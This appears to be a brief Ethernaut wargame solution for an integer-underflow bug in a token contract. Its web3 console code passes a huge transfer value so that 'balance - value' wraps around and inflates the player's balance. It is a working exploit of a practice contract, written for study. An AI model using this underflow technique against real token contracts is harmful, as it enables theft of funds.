`balance - value` causes an overflow

```
const BN = web3.utils.BN;
const value = new BN(2).pow(new BN(256)).div(new BN(2)).sub(new BN(1));
contract.transfer(ethernaut.address, value);
(await contract.balanceOf(player)).toString()
```
